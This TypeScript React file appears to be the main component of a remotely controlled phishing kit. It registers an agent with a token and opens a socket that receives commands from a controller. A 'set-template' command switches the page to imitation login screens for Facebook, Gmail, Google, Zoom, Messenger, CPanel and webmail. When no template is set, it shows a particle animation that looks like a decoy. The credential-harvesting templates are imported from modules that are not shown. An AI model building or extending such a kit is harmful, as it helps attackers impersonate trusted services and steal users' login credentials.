import { createRef, useEffect, useMemo, useState } from "react";
import {
  AgentSocket,
  AGENT_ID_KEY,
  getAgentIdAndToken,
  getToken,
  TOKEN_KEY,
} from "./agent";
import {
  CPanelTemplate,
  FacebookTemplate,
  GmailTemplate,
  GoogleTemplate,
  MeetTemplate,
  MessengerTemplate,
  WebmailTemplate,
  YouTubeTemplate,
  ZoomTemplate,
} from "./templates";

function App() {
  const [agentId, setAgentId] = useState(
    localStorage.getItem(AGENT_ID_KEY) || ""
  );
  const [token, setToken] = useState(localStorage.getItem(TOKEN_KEY) || "");
  const [agentSocket, setAgentSocket] = useState<AgentSocket | undefined>(
    undefined
  );
  useEffect(() => {
    if (agentSocket !== undefined) return;
    if (agentId && token) {
      setAgentSocket(
        new AgentSocket(agentId, token, () => {
          setTimeout(() => setAgentSocket(undefined), 1000);
          setToken("");
        })
      );
    } else {
      if (agentId) {
        getToken(agentId)
          .then(() => {
            setToken(localStorage.getItem(TOKEN_KEY) || "");
          })
          .catch(() => {
            setAgentId(localStorage.getItem(AGENT_ID_KEY) || "");
          });
      } else {
        getAgentIdAndToken().then(() => {
          setAgentId(localStorage.getItem(AGENT_ID_KEY) || "");
          setToken(localStorage.getItem(TOKEN_KEY) || "");
        });
      }
    }
  }, [agentSocket, agentId, token]);
  const query = useMemo(() => new URLSearchParams(window.location.search), []);
  const [template, setTemplate] = useState(
    query.get("template") || query.get("t")
  );
  useEffect(() => {
    if (agentSocket) {
      const subscription = agentSocket.commandsSubject.subscribe({
        next: ({ cmd, cmdId }) => {
          if (cmd.startsWith("set-template ")) {
            const t = cmd.split(" ")[1];
            if (t === "reset") {
              if (query.has("template")) query.delete("template");
              if (query.has("t")) query.delete("t");
              window.history.replaceState(
                {},
                "",
                query.toString() === ""
                  ? window.location.href.split("?")[0]
                  : `?${query.toString()}`
              );
              setTemplate(t);
              agentSocket.resultsSubject.next({
                cmdId,
                result: "template-reset",
              });
              window.location.reload();
            } else {
              query.set(query.has("template") ? "template" : "t", t);
              window.history.replaceState({}, "", `?${query.toString()}`);
              setTemplate(t);
              agentSocket.resultsSubject.next({
                cmdId,
                result: "template-set",
              });
            }
          }
        },
      });
      return () => subscription.unsubscribe();
    }
  }, [agentSocket]);
  if (template) {
    switch (template) {
      case "zoom":
        return <ZoomTemplate title="Zoom Call..." agentSocket={agentSocket!} />;
      case "facebook":
        return (
          <FacebookTemplate
            title="Facebook - log in or sign up"
            agentSocket={agentSocket!}
          />
        );
      case "youtube":
        return <YouTubeTemplate title="YouTube" agentSocket={agentSocket!} />;
      case "google":
        return <GoogleTemplate title="Google" agentSocket={agentSocket!} />;
      case "meet":
        return <MeetTemplate title="Google Meet" agentSocket={agentSocket!} />;
      case "gmail":
        return <GmailTemplate title="Gmail" agentSocket={agentSocket!} />;
      case "messenger":
        return (
          <MessengerTemplate title="Messenger" agentSocket={agentSocket!} />
        );
      case "cpanel":
        return (
          <CPanelTemplate title="CPanel Login" agentSocket={agentSocket!} />
        );
      case "webmail":
        return (
          <WebmailTemplate title="Webmail Login" agentSocket={agentSocket!} />
        );
    }
  }
  const canvasRef = createRef<HTMLCanvasElement>();
  useEffect(() => {
    if (canvasRef.current) {
      const canvas = canvasRef.current;
      const ctx = canvas.getContext("2d");
      if (ctx) {
        let hue = 1;
        let reverseHue = false;
        const mouse = {
          x: window.innerWidth / 2,
          y: window.innerHeight / 2,
        };
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        const particales: CanvasPartical[] = [];
        const drawParticales = () => {
          for (let i = 0; i < particales.length; i++) {
            particales[i].update();
            particales[i].draw();
            for (let j = i; j < particales.length; j++) {
              const dx = particales[i].x - particales[j].x;
              const dy = particales[i].y - particales[j].y;
              const distance = Math.sqrt(dx * dx + dy * dy);
              if (distance < 100) {
                ctx.strokeStyle = particales[i].color;
                ctx.beginPath();
                ctx.lineWidth = particales[i].size / 10;
                ctx.moveTo(particales[i].x, particales[i].y);
                ctx.lineTo(particales[j].x, particales[j].y);
                ctx.stroke();
                ctx.closePath();
              }
            }
            if (particales[i].size <= 0.3) {
              particales.splice(i, 1);
              i--;
            }
          }
        };
        window.addEventListener("resize", () => {
          canvas.width = window.innerHeight;
          canvas.height = window.innerHeight;
        });
        canvas.addEventListener("mousemove", (e) => {
          mouse.x = e.x;
          mouse.y = e.y;
          for (let i = 0; i < 5; i++) {
            particales.push(new CanvasPartical(mouse.x, mouse.y, hue, ctx));
          }
        });
        const animate = () => {
          ctx.fillStyle = "rgba(0, 0, 0, 0.2)";
          ctx.fillRect(0, 0, canvas.width, canvas.height);
          if (hue >= 255 || hue <= 0) reverseHue = !reverseHue;
          if (reverseHue) hue -= 5;
          else hue += 5;
          drawParticales();
          requestAnimationFrame(animate);
        };
        requestAnimationFrame(animate);
      }
    }
  }, [canvasRef.current]);
  return (
    <div className="w-full h-full">
      <canvas ref={canvasRef} />
    </div>
  );
}

export default App;

export class CanvasPartical {
  private _x: number;
  private _y: number;
  private _size: number;
  private _color: string;
  private speedX: number;
  private speedY: number;
  readonly connectedParticales: CanvasPartical[] = [];
  constructor(
    x: number,
    y: number,
    hue: number,
    private readonly ctx: CanvasRenderingContext2D
  ) {
    this._x = x;
    this._y = y;
    this._size = Math.random() * 15 + 1;
    this.speedX = Math.random() * 3 - 1.5;
    this.speedY = Math.random() * 3 - 1.5;
    this._color = `hsl(${hue}, 100%, 50%)`;
  }

  get size() {
    return this._size;
  }

  get x() {
    return this._x;
  }

  get y() {
    return this._y;
  }

  get color() {
    return this._color;
  }

  update = () => {
    this._x += this.speedX;
    this._y += this.speedY;
    if (this._size > 0.2) this._size -= 0.1;
  };

  draw = () => {
    this.ctx.fillStyle = this._color;
    this.ctx.beginPath();
    this.ctx.arc(this._x, this._y, this._size, 0, Math.PI * 2);
    this.ctx.fill();
    this.ctx.closePath();
  };
}
